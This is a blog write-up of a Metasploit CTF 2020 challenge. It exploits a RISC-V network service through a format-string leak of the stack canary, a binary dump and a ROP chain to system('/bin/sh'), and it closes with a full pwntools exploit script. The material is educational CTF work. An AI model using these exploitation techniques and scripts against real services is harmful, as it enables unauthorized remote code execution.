---
layout: default
---

_**Feb 11, 2020**_

# Metasploit CTF 2020 - Five of Hearts Writeup - RISC-V Buffer Overflow with NX and Canary

I participated with my team [Donkeys](https://metasploitctf.com/team/1023) to the [Metasploit CTF 2020](https://metasploitctf.com/scoreboard) and we ended up fifth! I personally really enjoyed how the CTF was well-curated and the quality of the challenges, especially the exotic ones like the [Plan 9 OS](https://en.wikipedia.org/wiki/Plan_9_from_Bell_Labs) based. In this writeup, I will describe how we solved the _Five of Hearts_ binary challenge by exploiting a buffer overflow and bypassing NX and canaries on the [RISC-V](https://en.wikipedia.org/wiki/RISC-V) architecture.

<script id="asciicast-R0cCGFINFT2rrEdBUF36dc7Py" src="https://asciinema.org/a/R0cCGFINFT2rrEdBUF36dc7Py.js" async></script>

_TL;DR_: you can find a copy of the binary and the source code of the final exploit on [GitHub](https://github.com/phra/metasploit2020-five-of-hearts/)

## Introduction

The challenge starts by discovering a service running on port 23/TCP.
We can forward the port locally by using the provided jump server and if we try to connect with [Ncat](https://nmap.org/ncat/) we will receive the following message:

```text
$ nc 127.0.0.1 23
I'm going to ask you a bunch of questions, and I want to have them answered immediately.

Who is your daddy?
```

We don't have a copy of the running binary so we are forced to fuzz the user input in order to discovery any kind of vulnerabilities.

## Exploitation Steps

Let's analyze in detail each step that we followed in order to produce a working exploit for the mentioned service.

### Fuzzing and Vulnerability Discovery

By trying different payloads, we are able to identify two distinct vulnerabilities, that are:

- Format String: by sending a sequence of characters that are interpreted by common format string functions, such as the [printf(3)](https://linux.die.net/man/3/printf) family, we are able to identify that our _conversion specifier_ are interpreted by the application and we can read its output. This will be exploited in order to implement an information leakage primitive required by the following steps.

```text
$ python -c 'print "%c"*7 + "AAAAAAAA" + ".%p"*50' | nc 172.16.63.245 23
I'm going to ask you a bunch of questions, and I want to have them answered immediately.

Who is your daddy?AAAAAAAA.(nil).0x40007fcab7.0xf6d0049f13023b00.0xf6d0049f13023b00.0x68.(nil).(nil).0x4141414141414141.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x70252e70252e.0x23292.0x40007fcb08.0xf6d0049f13023b00.(nil).(nil).(nil).0x108de.0x1084e.0x1039e.0x40007fcc98.(nil).0x1.0xf6d0049f13023b00.0x6f260.0x103aa.0x1084e.0x10522.(nil).0x1.0x40007fcc88.0x1037e.(nil).0x10502
```

- Buffer Overflow: by sending a long sequence of characters we can notice a crash by the application due to a failure in the stask smashing protection checks. This indicates that application is vulnerable to a buffer overflow and it was compiled with canaries enabled.

```text
$ python -c 'print "A"*1000' | nc 172.16.63.245 23
I'm going to ask you a bunch of questions, and I want to have them answered immediately.

Who is your daddy? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
*** stack smashing detected ***: <unknown> terminated
```

### Information Leakage

From the first output we can identify the following informations:

- since the `%p` specifier is printing 8-byte values, it means that the application is running on a 64-bit architecture.
- we can identify the canary value because it always ends with a `\x00` character and in this case it's `0xf6d0049f13023b00`.
- we leak some addresses that doesn't really make sense in a X86_64 architecture, such as `0x103aa`.
- if we send the payload multiple times, we notices every time different canary values, indicating that the application is restarted after each connection and it's likely exposed on the network by the [inetd](https://www.freebsd.org/cgi/man.cgi?inetd(8)) service.

After discovering this _critical intel_, the next step is to convert this ability in a arbritary read primitive in order to be able to leak the binary from memory and proceed to static analysis.

The final `leak()` function that will grant us the ability to leak arbitrary addresses and the rest of the code to dump sections of memory is the following:

```python
from pwntools import *

@MemLeak
@MemLeak.NoNewlines
@MemLeak.String
def leak(addr):
  old_level = context.log_level
  context.log_level = 'error'
  r = remote(ADDR, PORT)
  context.log_level = old_level
  r.recvuntil('Who is your daddy? ', drop=True)
  r.sendline('%13$s|||' + '%c'*16  + p64(addr))
  old_level = context.log_level
  context.log_level = 'debug'
  a = r.recvuntil('|||', drop=True)
  log.debug('leaked {} => {}'.format(hex(addr), repr(a)))
  context.log_level = 'error'
  r.close()
  context.log_level = old_level
  return a

def dump_binary(addr, length = 0x10000):
  current = addr
  dumped = ''
  while current < addr + length:
    s = leak(current)
    if s == None:
      dumped += '\x00'
      current += 1
      continue
    else:
      dumped += s
      current += len(s)
  return dumped

def save_file(filename, content):
  print 'generating %s.. [size: %d]' % (filename, len(content))
  f = open(filename, 'w')
  f.write(content)
  f.close()

binary = dump_binary(0x10000, 0x5dae0)
save_file('binary', binary)
```

If we leak the address `0x10000` we find the ELF magic bytes `\x7fELF` indicating the start of the mapped binary in the process memory.

We proceed to dump the header of the ELF file in order to see the binary size and other information. After leaking around 4KB of data, we can open it in [Radare2](https://github.com/radareorg/radare2) and parse the header with the `ia` command:

```text
$ r2 binary-0x10000-0x1b86a
 -- There's a branch for that.
[0x000101f8]> ia
arch     riscv
baddr    0x10000
binsz    383712
bintype  elf
bits     64
canary   false
class    ELF64
crypto   false
endian   little
havecode true
laddr    0x0
lang     c
linenum  true
lsyms    true
machine  RISC V
nx       true
os       linux
pic      false
relocs   true
rpath    NONE
sanitiz  false
static   true
stripped false
subsys   linux
va       true
[Imports]
nth vaddr bind type lib name
――――――――――――――――――――――――――――

[Exports]

nth paddr vaddr bind type size lib name
―――――――――――――――――――――――――――――――――――――――


[0x000101f8]>
```

We just discovered that the binary is running on the [RISC-V](https://en.wikipedia.org/wiki/RISC-V) architecture!
This explains the weird addresses that we were previously leaking with the format string vulnerabilty.
Let's continue to dump the rest of the binary to proceed to a statical analysis with Radare2.
Around address `0x40000` we reach the `.rodata` section and we leak the strings that we were seeing over the network, including a new `hack` string. If we reply to the questions with it, the binary is gentle enough to send us a copy of itself.

Now that we finally have an entire copy of the ELF binary, we can open it in Radare2 and proceed with a more accurate analysis.

### Static Analysis

We immediately notice a bigger size of the binary and a bigger number of symbols than expected. If we parse now the headers, we are able to get more precise information compared to the partial one:

```text
$ r2 binary
 -- You will soon have an out of memory experience.
[0x000101f8]> ia
arch     riscv
baddr    0x10000
binsz    384207
bintype  elf
bits     64
canary   false
class    ELF64
compiler GCC: (GNU) 7.3.1 20180129 GCC: (GNU) 7.3.1 20180303 (Red Hat 7.3.1-5)
crypto   false
endian   little
havecode true
laddr    0x0
lang     c
linenum  false
lsyms    false
machine  RISC V
nx       true
os       linux
pic      false
relocs   false
rpath    NONE
sanitiz  false
static   true
stripped true
subsys   linux
va       true
[Imports]
nth vaddr bind type lib name
――――――――――――――――――――――――――――

[Exports]

nth paddr vaddr bind type size lib name
―――――――――――――――――――――――――――――――――――――――


[0x000101f8]>
```

Beside Radare2 is still indicating that canaries are not present, that is wrong due to the failure message that we receive about stack smashing when we cause an overflow in the application, we are now able to confirm that the binary is statically compiled with the [Standard C Library](https://linux.die.net/man/7/libc). This will help us to bypass the [Address Space Layout Randomization](https://en.wikipedia.org/wiki/Address_space_layout_randomization) since the binary is not compiled as [Position-Indipendent Executable](https://en.wikipedia.org/wiki/Position-independent_code).

Now the exploitation plan is clear: we need to build a [ROP chain](https://en.wikipedia.org/wiki/Return-oriented_programming) in order to bypass the [NX bit](https://en.wikipedia.org/wiki/NX_bit) mitigation by following the RISC-V calling conventions in order to call the [system(3)](https://linux.die.net/man/3/system) function in the Libc and spawn an interactive shell.

### Building the ROP Chain

First we need to read the [RISC-V Instruction Set Manual](https://content.riscv.org/wp-content/uploads/2017/05/riscv-spec-v2.2.pdf) in order to understand its [calling convention](https://github.com/riscv/riscv-elf-psabi-doc/blob/master/riscv-elf.md).

To speed up the learning of the information required to build a working exploit, we really appreciated the talk _Exploiting Buffer Overflows on RISC-V_ by Christina Quast available on Youtube:

<iframe width="560" height="315" src="https://www.youtube.com/embed/q2xbaU8Rbfg" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>

The main ingredients required to build a working ROP chain are:

1. the address of the `system(3)` function
1. the address of the `/bin/sh` string
1. the address of a gadget to control the `a0` register

#### Finding system(3)

Since the binary it's stripped, we are forced to perform a bit of reverse engineering on the executable in order to identify where the `system(3)` function is located. We can first trace where the `execve(3)` function is by looking for something characteristic of it, for instance by finding where the `execve(2)` syscall is called, and then check where this function is used since the `system` for sure calls it.

Let's do it using Radare2:

```text
$ r2 binary
 -- Step through your seek history with the commands 'u' (undo) and 'U' (redo)
[0x000101f8]> aaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Check for objc references
[x] Check for vtables
[x] Finding xrefs in noncode section with anal.in=io.maps
[x] Analyze value pointers (aav)
[x] Value from 0x00010000 to 0x0006b0a2 (aav)
[x] 0x00010000-0x0006b0a2 in 0x10000-0x6b0a2 (aav)
[Warning: No SN reg alias for current architecture.
[x] Emulate code to find computed references (aae)
[x] Type matching analysis for all functions (aaft)
[x] Propagate noreturn information
[x] Use -AA or aaaa to perform additional experimental analysis.
[0x000101f8]> /ad li a7, 221
0x00021650   # 4: li a7, 221
[0x000101f8]> s 0x00021650
[0x00021650]> pd 1
│           ; CALL XREF from fcn.00014c2a @ +0x768
│           ;-- hit0_0:
│           0x00021650      9308d00d       li a7, 221
[0x00021650]> sf.
[0x0002161a]> pd 1
            ; XREFS: CALL 0x000101ec  CALL 0x00014326  CALL 0x00014a68  CALL 0x0001539a  CALL 0x00024030  CALL 0x0003f814  
            ; XREFS: CALL 0x00040cfa  CALL 0x00041e04  CALL 0x00042890  CALL 0x00042ac0  CALL 0x000433bc  CALL 0x00045e72  
            ; XREFS: CALL 0x00046a1a  
┌ 80: fcn.0002161a (int64_t arg_48h, int64_t arg_2cch, int64_t arg_2d4h);
│ bp: 0 (vars 0, args 0)
│ sp: 3 (vars 0, args 3)
│ rg: 0 (vars 0, args 0)
│           0x0002161a      aa87           mv a5, a0
[0x0002161a]> afn execve
[0x0002161a]> pd 1
            ; XREFS: CALL 0x000101ec  CALL 0x00014326  CALL 0x00014a68  CALL 0x0001539a  CALL 0x00024030  CALL 0x0003f814  
            ; XREFS: CALL 0x00040cfa  CALL 0x00041e04  CALL 0x00042890  CALL 0x00042ac0  CALL 0x000433bc  CALL 0x00045e72  
            ; XREFS: CALL 0x00046a1a  
            ;-- fcn.0002161a:
┌ 80: execve (int64_t arg_48h, int64_t arg_2cch, int64_t arg_2d4h);
│ bp: 0 (vars 0, args 0)
│ sp: 3 (vars 0, args 3)
│ rg: 0 (vars 0, args 0)
│           0x0002161a      aa87           mv a5, a0
[0x0002161a]> axt
(nofunc) 0x101ec [CALL] jal ra, execve
(nofunc) 0x14326 [CALL] jal ra, execve
(nofunc) 0x14a68 [CALL] jal ra, execve
(nofunc) 0x1539a [CALL] jal ra, execve
(nofunc) 0x24030 [CALL] jal ra, execve
(nofunc) 0x3f814 [CALL] jal ra, execve
(nofunc) 0x40cfa [CALL] jal ra, execve
(nofunc) 0x41e04 [CALL] jal ra, execve
(nofunc) 0x42890 [CALL] jal ra, execve
(nofunc) 0x42ac0 [CALL] jal ra, execve
(nofunc) 0x433bc [CALL] jal ra, execve
(nofunc) 0x45e72 [CALL] jal ra, execve
(nofunc) 0x46a1a [CALL] jal ra, execve
[0x0002161a]> s 0x1539a
[0x0001539a]> pd 13
            0x0001539a      efc00028       jal ra, execve
            0x0001539e      efd0307b       jal ra, fcn.00023350
            ; CALL XREF from fcn.00010224 @ +0x10a
┌ 32: fcn.000153a2 (int64_t arg_1h, int64_t arg_3h, int64_t arg_60h, int64_t arg_68h, int64_t arg_0h, int64_t arg_c0h, int64_t arg_110h, int64_t arg_258h, int64_t arg_278h, int64_t arg_2d0h);
│           ; arg int64_t arg_1h @ s0+0x1
│           ; arg int64_t arg_3h @ s0+0x3
│           ; arg int64_t arg_60h @ s0+0x60
│           ; arg int64_t arg_68h @ s0+0x68
│           ; arg int64_t arg_0h @ sp+0x0
│           ; arg int64_t arg_c0h @ sp+0xc0
│           ; arg int64_t arg_110h @ sp+0x110
│           ; arg int64_t arg_258h @ sp+0x258
│           ; arg int64_t arg_278h @ sp+0x278
│           ; arg int64_t arg_2d0h @ sp+0x2d0
│           0x000153a2      19c1           beqz a0, 0x153a8
│           0x000153a4      6ff03fcd       j 0x15076
│           0x000153a8      37e50400       lui a0, 0x4e
│           0x000153ac      4111           addi sp, sp, -16
│           0x000153ae      130585dc       addi a0, a0, -568
│           0x000153b2      06e4           sd ra, 8(sp)
│           0x000153b4      eff03fcc       jal ra, 0x15076
│           0x000153b8      a260           ld ra, 8(sp)
│           0x000153ba      13351500       seqz a0, a0
└           0x000153be      4101           addi sp, sp, 16
│           0x000153c0      8280           ret
[0x0001539a]> s 0x000153a2
[0x000153a2]> afn system
[0x000153a2]> pd 1
            ; CALL XREF from fcn.00010224 @ +0x10a
            ;-- fcn.000153a2:
┌ 32: int system (const char *string);
│ bp: 4 (vars 0, args 4)
│ sp: 6 (vars 0, args 6)
│ rg: 0 (vars 0, args 0)
│           0x000153a2      19c1           beqz a0, 0x153a8
```

In detail, the commands do the following:

- `aaa`: analyze the executable
- `/ad li a7, 221`: find where the `execve(2)` syscall number is used
- `s 0x00021650`: seek to its location
- `sf.`: seek to the start of the function
- `afn execve`: rename it to `execve`
- `axt`: find x-refs to the `execve` function
- `s 0x1539a`: seek to a specific call that we think to be the one in the `system` function
- `pd 25`: disassemble the next 25 instructions to discover the beginning of this function since Radare2 is not able to understand to which function the gadget belongs to
- `s 0x000153a2`: seek to it
- `afn system`: rename the symbol to `system`

After the analysis, we discover that the address of the `system(3)` function is `0x153a2`.

#### Finding /bin/sh

In order to find the string we can issue the following command in Radare2:

```text
[0x000101f8]> / /bin/sh
Searching 7 bytes in [0x6eae0-0x701d8]
hits: 0
Searching 7 bytes in [0x6cb60-0x6eae0]
hits: 0
Searching 7 bytes in [0x10000-0x6b0a2]
hits: 1
0x0004ddc0 hit0_0 .sh-c/bin/shexit 0wfileop.
[0x000101f8]> psz @ 0x0004ddc0
/bin/sh
```

We now know that the `/bin/sh` string is located at the address `0x4ddc0`.

#### Finding a0 gadget

We can use the following command to retrieve all the `a0` gadget available in the executable:

```text
[0x000101f8]> "/ad/ *; *; *; ret"
...
0x0004b3bc   # 8: addi a4, a4, 8; mv a0, a4; sd a5, 0(a3); ret
0x0004b640   # 8: li a0, 0; ret; ld a0, 0(a1); ret
0x0004ba0e   # 8: ld s10, 32(sp); ld s11, 24(sp); addi sp, sp, 128; ret
0x0004bc80   # 8: ld s4, 80(sp); ld s5, 72(sp); addi sp, sp, 128; ret
0x0004c494   # 10: j 0x4c3d4; lw a5, 0(a0); bnez a5, 0x4c496; ret
0x0004c918   # 8: addi a4, a4, 8; mv a0, a4; sd a5, 0(a3); ret
0x0004cd28   # 8: ld s1, 8(sp); ld s2, 0(sp); addi sp, sp, 32; ret
0x0004d538   # 8: ld s1, 8(sp); ld s2, 0(sp); addi sp, sp, 32; ret
[0x000101f8]> "/ad/ *; *; *; ret" | grep 'ld a0'
...
0x00066ee8   # 2: ld a0, 280(sp)
0x00066eea   # 2: ld a0, 88(sp)
0x00066eec   # 2: ld a0, 280(sp)
0x00066f0d   # 2: ld a0, 200(a0)
0x00066f16   # 2: ld a0, 344(sp)
0x000678b0   # 2: ld a0, 96(a1)
0x00068216   # 2: ld a0, 0(s0)
0x00068960   # 2: ld a0, 8(a2)
0x00068afd   # 2: ld a0, 8(s0)
[0x000101f8]> "/ad/ *; *; *; ret" | grep 'ld a0' | cut -d',' -f2 | sort -nr | uniq | grep sp
...
 112(sp)
 104(sp)
 96(sp)
 88(sp)
 80(sp)
 72(sp)
 64(sp)
 56(sp)
 48(sp)
 40(sp)
 32(sp)
 24(sp)
 16(sp)
 8(sp)
 0(sp)
[0x000101f8]> "/ad/ ld a0, 24(sp)*;*;*;ret"
0x0004a9d2   # 8: ld a0, 24(sp); ld ra, 40(sp); addi sp, sp, 48; ret
[0x000101f8]> pd 1 @ 0x0004a9d2
            0x0004a9d2      8280           ret
[0x000101f8]> pd 4 @ 0x0004a9cc
            0x0004a9cc      6265           ld a0, 24(sp)
            0x0004a9ce      a270           ld ra, 40(sp)
            0x0004a9d0      4561           addi sp, sp, 48
            0x0004a9d2      8280           ret
```

In detail, the commands do the following:

- `"/ad/ *; *; *; ret"`: search for all the available gadget with length 3
- `"/ad/ *; *; *; ret" | grep 'ld a0'`: get all `a0` gadget
- `"/ad/ *; *; *; ret" | grep 'ld a0' | cut -d',' -f2 | sort -nr | uniq | grep sp`: get all `a0` gadget that loads values from the stack and all their offsets
- `"/ad/ ld a0, 24(sp)*;*;*;ret"`: get the address of a specific gadget

We now know that the address of the `a0` gadget that we need is located at address `0x4a9d2`.

### Debugging

In order to debug the exploit, we can install a Q-EMU based VM in order to emulate a RISC-V system:

```bash
# start a Debian container and spawn a shell
docker run -itp 1234:10000 debian
# install qemu inside the container
apt install qemu-system-riscv64 wget xzdec
# download RISC-V system image
wget https://fedorapeople.org/groups/risc-v/disk-images/stage4-disk.img.xz
# decompress it
xzdec -d stage4-disk.img.xz > stage4-disk.img
# launch the image
qemu-system-riscv64 \
   -nographic \
   -machine virt \
   -smp 4 \
   -m 2G \
   -object rng-random,filename=/dev/urandom,id=rng0 \
   -device virtio-rng-device,rng=rng0 \
   -device virtio-blk-device,drive=hd0 \
   -drive file=stage4-disk.img,format=raw,id=hd0 \
   -device virtio-net-device,netdev=usernet \
   -netdev user,id=usernet,hostfwd=tcp::10000-:22
```

We will be able to login via SSH locally on port 1234 as `root:riscv`.
Here we can install GDB and debug the binary to get the correct offset for the gadget and confirm that we correctly identified the `system(3)` function by putting a breakpoint or stepping after sending the `hack` string that will execute `system("/bin/cat /qemu/arnold")` in order to print the executable to _stdout_.

## Final Exploit

The final exploit is the following:

```python
#!/usr/bin/env python

from time import sleep
from pwn import *

'''
0x0004ddc0 => /bin/sh\x00
0x00015076 => system

0x0004a9cc      6265           ld a0, 24(sp)
0x0004a9ce      a270           ld ra, 40(sp)
0x0004a9d0      4561           addi sp, sp, 48
0x0004a9d2      8280           ret
'''

ADDR = sys.argv[1]
PORT = int(sys.argv[2])

context( word_size=64, os='linux')

r = remote(ADDR, PORT)
r.recvuntil('Who is your daddy? ')
r.sendline('%p.'*3 + 'XXXXX')
a = r.recvuntil('XXXXX')
v = a.split('.')
canary = int(v[2], 16)
r.recvuntil('And what does he do? ')

a0_gadget = 0x0004a9cc
system_addr = 0x000153a2
binsh_addr = 0x0004ddc0

payload = 'A'*24 + p64(binsh_addr) + 'A'*8 + p64(system_addr)
r.sendline('A'*256 + p64(canary) + 'B'*8 + p64(a0_gadget) + payload)

r.recv(1024)

r.interactive()
r.close()
```

[back](../)
